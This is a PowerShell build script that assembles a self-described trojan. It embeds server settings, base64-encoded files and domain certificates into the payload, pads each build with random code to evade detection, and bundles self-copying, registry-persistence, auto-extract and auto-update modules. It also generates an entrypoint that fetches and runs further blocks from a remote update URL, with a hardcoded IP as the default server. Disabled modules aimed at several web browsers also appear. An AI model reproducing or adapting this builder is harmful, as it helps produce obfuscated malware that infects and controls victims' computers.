param (
    [string]$serverName
)

if ($serverName -eq "") {
    $serverName = "26.52.168.113"
    $action = "exe"
} 

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName


Set-Location -Path $scriptDir
. ".\troyancompile.randomer.ps1"



Write-Host "troyan"

function GetUtfNoBom {
    param (
        [string]$file
    )

    # Read the file as a byte array
    $contentBytes = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
        # Remove the BOM
        $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
    }

    # Convert the byte array back to a UTF-8 string
    $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)

    return $contentWithoutBom
}

$outPath = Join-Path -Path $server.troyanDir -ChildPath "_output"
if (-not (Test-Path $outPath )) {
    New-Item -Path $outPath  -ItemType Directory
}
if (-not [string]::IsNullOrEmpty($outPath)) 
{
    Remove-Item -Path $outPath\* -Recurse -Force
    if (-not (Test-Path $outPath )) {
        New-Item -Path $outPath  -ItemType Directory
    }
}
function Get-LocalHephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $hephaestusFolder
}
$outPath = Get-LocalHephaestusFolder
if (-not (Test-Path $outPath )) {
    New-Item -Path $outPath  -ItemType Directory
}
if (-not [string]::IsNullOrEmpty($outPath)) 
{
    Remove-Item -Path $outPath\* -Recurse -Force
    if (-not (Test-Path $outPath )) {
        New-Item -Path $outPath  -ItemType Directory
    }
}
$outPath = $server.troyanOutputBlock
if (-not (Test-Path $outPath )) {
    New-Item -Path $outPath  -ItemType Directory
}
if (-not [string]::IsNullOrEmpty($outPath)) 
{
    Remove-Item -Path $outPath\* -Recurse -Force
    if (-not (Test-Path $outPath )) {
        New-Item -Path $outPath  -ItemType Directory
    }
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )

    # Create a StreamWriter to write without BOM
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()

    # Forcefully overwrite the file to ensure no BOM is present
    # Read back the written file as byte array
    $writtenContent = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        # Remove the BOM bytes
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }

    # Write back the content without BOM
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}


function Filter-ObjectByKeywords {
    param (
        [Parameter(Mandatory = $true)]
        [PSObject]$object,
        
        [Parameter(Mandatory = $true)]
        [string[]]$keywords
    )

    # Create a new empty custom object
    $filteredObject = [PSCustomObject]@{}

    # Iterate over each property of the input object
    foreach ($property in $object.PSObject.Properties) {
        # Check if the property name contains any of the keywords
        $shouldInclude = $true
        foreach ($keyword in $keywords) {
            if ($property.Name -like "*$keyword*") {
                $shouldInclude = $false
                break
            }
        }

        # If the property name does not match any keyword, add it to the new object
        if ($shouldInclude) {
            $filteredObject | Add-Member -MemberType NoteProperty -Name $property.Name -Value $property.Value
        }
    }
    try {
        $filteredObject.dnSponsor = $null
    }
    catch {

    }
    return $filteredObject
}



function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

function Convert-StringToBase64 {
    param (
        [Parameter(Mandatory = $true)]
        [string]$InputString
    )
    
    # Convert the string to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    
    # Encode the bytes to a Base64 string
    $base64String = [Convert]::ToBase64String($bytes)
    
    # Return the Base64-encoded string
    return $base64String
}

function Convert-ArrayToQuotedString {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Array
    )

    # Process each element to enclose in double quotes and join with commas
    $quotedArray = $Array | ForEach-Object { "`"$_`"" }
    $joinedString = $quotedArray -join ","

    return $joinedString
}

Function Check-Array {
    param (
        [object]$InputObject
    )

    if ($null -ne $InputObject -and $InputObject.Length -gt 0 -and $InputObject -ne '') {
        return $true
    } else {
        return $false
    }
}


function Create-EmbeddingFiles {
    param (
        [string]$name
    )

    $srcFolder = Join-Path -Path $server.userDataDir -ChildPath "$name"

    if (-not (Test-Path -Path $srcFolder))
    {
        $files = @()
    } else
    {
        $files = (Get-ChildItem -Path $srcFolder -File) 
    }
    if ($null -eq $files){
        $files = @()
    }
    if (-not ($files.GetType().Name -eq 'Object[]')) {
        $files = @($files)
    }
    
    $resultName = @()
    $resultData = @()
    foreach ($file in $files) {
        $filename = [System.IO.Path]::GetFileName($file.FullName)
        $data= Encode-FileToBase64 -inFile $file.FullName
        $resultData += $data
        $resultName += $filename
    }
    if (Check-Array -InputObject $resultData -eq $true)
    {
        $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
        $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
        return ($joinedResultName, $joinedResultData)
    } else {
        return ($null, $null)
    }
}

function Format-ArrayToString {
    param (
        [string[]]$inputArray
    )
    if ($inputArray -eq $null -or $inputArray.Length -eq 0) {
        return ""
    }
    $result = ""
    foreach ($item in $inputArray) {
        $result += "'${item}', "
    }
    $result = $result.TrimEnd(', ')
    return $result
}

function Make-Template-Body { 
    $template = @"
    `$server = '_SERVER' | ConvertFrom-Json

"@
    $keywords = @("Dir", "troyan","dnSponsor", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
    $filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
    $servStr = ($filteredObject | ConvertTo-Json)
    $template  = $template -replace "_SERVER", $servStr
    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_body.ps1")

    return $template
}


function Make-Template-Embeddings { 

    $template=""
        $template += @"
        `$xfront = @(
        _FRONT_X
        )
        `$xfront_name = @(
        _FRONT_NAME
        )
        `$xembed = @(
        _EMBED_X
        )
        `$xembed_name = @(
        _EMBED_NAME
        )
"@
        ($name, $data) = Create-EmbeddingFiles -name "front"
        $template = $template -replace "_FRONT_X", $data
        $template = $template -replace "_FRONT_NAME", $name
        ($name, $data) = Create-EmbeddingFiles -name "embeddings"
        $template = $template -replace "_EMBED_X", $data
        $template = $template -replace "_EMBED_NAME", $name
        $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_embeddings.ps1")
}

function Make-Template-Cert {
        $template = ""
        $template += @"

        `$xdata = @{
        _CERT
    }
        
"@
    $stringList = @()
    foreach ($domain in $server.domains) 
    {

        $pathPfx = pfxFile($domain)
        if ([string]::IsNullOrEmpty($pathPfx)) {
            throw "The certficiate is not found for domain: $domain"
        }
        $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
        $base64 = [Convert]::ToBase64String($binaryData)
        $chunkSize = 200
        $chunks = @()
        for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
            $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
            $chunks += $chunk
        }
        $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
        $stringList += "'" + $domain + "'=" + $code
    }

    $listString = $stringList -join [System.Environment]::NewLine
    $template  = $template -replace "_CERT", $listString    
    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_cert.ps1")
} 

function Make-Template-AutoExtract {
    $template = ""
    $template += @"

    `$xbody = "__BODY"

"@

    $body = Encode-FileToBase64 -inFile $server.troyanBody
    $template = $template -replace "__BODY", $body
    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autoextract.ps1")
}

function Make-Template-AutoCopy{  param ([string]$selfTemplate)
    $template = @"

    `$xholder = "__SELF"

"@
   
    $template = $template -replace "__SELF", $selfTemplate
    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autocopy.ps1")
}

function Enrich-AutoCopy { 
    param ( [string]$targetFile)

    $template = GetUtfNoBom -file $targetFile
    $add = GetUtfNoBom -file (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_autocopy.ps1")
    $template = $add + $template
    Utf8NoBom -data $template -file $targetFile
}
    



function Make-Ps1Files {
    param ([string]$target)

    $allFiles = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
    
    $holderFiles = @()
    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_body.ps1") }
    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_embeddings.ps1") }
    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_autoextract.ps1") }
    $holderFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
    $holderFiles += $allFiles | Where-Object { $_.Name -in @("autocopy.ps1", "autoextract.ps1", "autoregistry.ps1", "embeddings.ps1", "autoupdate.ps1") }
    $holderFiles += $allFiles | Where-Object { $_.Name -in @("holder_mono.ps1") }

    $exceptFiles = $allFiles | Where-Object { $_.Name -in @("holder.ps1") -or $_.Name -in @("holder_suffix.ps1") -or $_.Name -in @("entrypoint.ps1") -or $_.Name -in @("consts_autocopy.ps1")    }

    if ($target -ne "body")
    {
        return $holderFiles
    }

    if ($target -eq "body") {
        $holderFileNames = $holderFiles.Name
        $exceptFileNames = $exceptFiles.Name
        $returnFiles = @()
        $returnFiles += $allFiles | Where-Object { $_.Name -in @("consts_body.ps1") }
        $returnFiles += $allFiles | Where-Object { $_.Name -in @("consts_cert.ps1") }
        $returnFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
        $returnFiles += $allFiles | Where-Object { $_.Name -notin $exceptFileNames -and  $_.Name -notin $holderFileNames -and $_.Name -notin @("utils.ps1") -and $_.Name -notin @("program.ps1")  -and $_.Name -notin @("consts_body.ps1")   -and $_.Name -notin @("consts_cert.ps1") }
        $returnFiles += $allFiles | Where-Object { $_.Name -in @("program.ps1")}
    }

    return $returnFiles
}

function BuldScriptMono{
    param (
       [array]$files, [string]$outputFile, [bool]$random)

        $pref = '
        # $generalJob = Start-Job -ScriptBlock {

            function writedbg2 {
                    param (
                        [string]$msg,   [string]$msg2=""
                    )
                }
                '

        $suff = '
       #    }
       # Wait-Job -Job $generalJob
       # Receive-Job -Job $generalJob
       # Remove-Job -Job $generalJob
        ';


    $joinedContent = $pref
    if ($random -eq $true)
    {
        $joinedContent += Generate-RandomCode
    }
    foreach ($file in $files) {
        $fileContent = GetUtfNoBom -file $file.FullName
        $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./consts_body.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./consts_embeddings.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./consts_cert.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./consts_autocopy.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./consts_autoextract.ps1', "`n`n"
        if ($random -eq $true)
        {
            $joinedContent += Generate-RandomCode
        }
        $fn = $file.Name
        $joinedContent += "`n`n" + "# $fn" + "`n`n" + $fileContent + [System.Environment]::NewLine
    }
    if ($random -eq $true)
    {
        $joinedContent += Generate-RandomCode
    }
    $joinedContent += $suff
    if ($random -eq $true)
    {
        $joinedContent += Generate-RandomCode
    }
    Utf8NoBom -data $joinedContent -file $outputFile
}

Make-Template-Body
Make-Template-Embeddings
Make-Template-Cert


$files = Make-Ps1Files -target "body"
BuldScriptMono -files $files -outputFile $server.troyanBody -random $true
BuldScriptMono -files $files -outputFile $server.troyanBodyClean -random $false
$encoded = Encode-FileToBase64 -inFile $server.troyanBody
Utf8NoBom -data $encoded -file $server.userTroyanBody

Make-Template-AutoExtract

$files = Make-Ps1Files -target "holder_mono"
BuldScriptMono -files $files -outputFile $server.troyanHolderMono -random $true
BuldScriptMono -files $files -outputFile $server.troyanHolderCleanMono -random $false

$holderSelf = Encode-FileToBase64 -inFile $server.troyanHolderMono
Make-Template-AutoCopy -selfTemplate $holderSelf
Enrich-AutoCopy -targetFile $server.troyanHolderMono
Enrich-AutoCopy -targetFile $server.troyanHolderCleanMono
##



function BuldScript
{
    function get{
    param ([string]$name)
    
        $fn =Join-Path -Path $server.troyanScriptDir -ChildPath ($name + ".ps1")
        $contentBytes = [System.IO.File]::ReadAllBytes($fn)
        $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
        return  "`n`n" + $contentWithoutBom +  "`n`n"
    }

    $pref = '

        function writedbg2 {
                param (
                    [string]$msg,   [string]$msg2=""
                )
            }
            '

    $suff = '

    ';

    $utils = get -name "utils"
    $consts_holder = get -name "consts_holder"
    $consts_holder_mono = get -name "consts_holder_mono"
    $consts_embeddings = get -name "consts_embeddings"
    $consts_cert = get -name "consts_cert"

    function make
    {
        param ([object]$cur, [object]$next)

        $fn = $cur.block
        $base = $server.updateUrlBlock
        $nextBlock = $next.block
        $fileContent =""
        if ($fn -eq "entrypoint")
        {
        
            $fileContent = "

. ./consts_holder.ps1
. ./utils.ps1

RunRemote -baseUrl '$base' -block '$nextblock'

"
            Utf8NoBom -data $fileContent -file (Join-Path -Path $server.troyanScriptDir -ChildPath "entrypoint.ps1")
        }
        
        $fileContent += get -name $fn
        $fileContent = $fileContent -replace "\.\s+\./[^/]+\.ps1", "`n`n"
        $fileContent += $suff    
        
        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ($fn + ".ps1")
        if ($fn -eq "embeddings")
        {
            $fileContent = $utils + (Generate-RandomCode) + $consts_holder +  $consts_embeddings +  $fileContent
        }
        elseif ($fn -eq "autocopy")
        {
            $fileContent = $utils + (Generate-RandomCode) + $consts_holder_mono +  $consts_cert +  $fileContent
        }
        elseif ($fn -eq "cert")
        {
            $fileContent = $utils + (Generate-RandomCode) + $consts_holder +  $consts_cert +  $fileContent
        }
        else 
        {
            $fileContent = $utils + (Generate-RandomCode) + $consts_holder + $fileContent
        }
        $fileContent = $pref + (Generate-RandomCode) +  $fileContent + $suff + (Generate-RandomCode)



        Utf8NoBom -data $fileContent -file $outFile

        $encoded = Encode-FileToBase64 -inFile $outFile
        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ([System.IO.Path]::ChangeExtension($fn, ".txt"))
        Utf8NoBom -data $encoded -file $outFile
    }

    $units = @(
        [PSCustomObject]@{ block = "holder"; isJob = $true; isWait = $false; isStart = $true},

        [PSCustomObject]@{ block = "entrypoint"; isJob = $true; isWait = $false; isStart = $true},

        [PSCustomObject]@{ block = "autocopy"; isJob = $true; isWait = $false },

        [PSCustomObject]@{ block = "autoregistry"; isJob = $true; isWait = $false; isStop = $true }


        # [PSCustomObject]@{ block = "dnsman"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "cert"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "chrome"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "edge"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "yandex"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "firefox"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "opera"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "chrome_ublock"; isJob = $true; isWait = $false }
        
        # [PSCustomObject]@{ block = "chrome_push"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "tracker"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "extraupdate"; isJob = $true; isWait = $false }
    )
    

    for ($no = 0; $no -lt $units.Length; $no++)
    {
        $cur = $units[$no]
        $next = if ($no + 1 -lt $units.Count) { $units[$no + 1] } else { $null }
        if ($cur.isStop)
        {
            $next = $null
        }

        Write-Output "Iteration $no :"
        Write-Output "Current: Block = $($cur.block), isJob = $($cur.isJob), isWait = $($cur.isWait)"
        if ($null -ne $next) {
            Write-Output "Next: Block = $($next.block), isJob = $($next.isJob), isWait = $($next.isWait)"
        } else {
            Write-Output "Next: None"
        }
        
        make -cur $cur, -next $next 
        
        Write-Output "----"
    }
}


# Make-Template-Holder -target "holder" -withBody $false -withSelf $false -selfTemplate $holderBase
# BuldScript
# Copy-Item -Path (Join-Path -Path $server.troyanOutputBlock -ChildPath "holder.ps1") -Destination $server.troyanHolder -Force
# $outPath = $server.userTroyanBlock
# if (-not [string]::IsNullOrEmpty($outPath)) 
# {
#     Remove-Item -Path $outPath\* -Recurse -Force
#     if (-not (Test-Path $outPath )) {
#         New-Item -Path $outPath  -ItemType Directory
#     }
# }
# Copy-Item -Path $server.troyanOutputBlock -Destination $server.userDataDir -Force -Recurse

# Write-Host "Troyan Compile complete"